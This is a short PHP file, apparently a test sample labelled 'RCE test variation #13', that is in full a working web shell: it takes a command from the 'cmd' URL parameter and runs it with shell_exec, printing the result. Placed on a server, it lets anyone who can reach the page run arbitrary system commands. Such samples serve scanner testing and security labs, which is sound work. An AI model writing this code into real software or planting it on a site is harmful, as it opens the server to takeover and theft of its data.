<?php
// RCE test variation #13
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>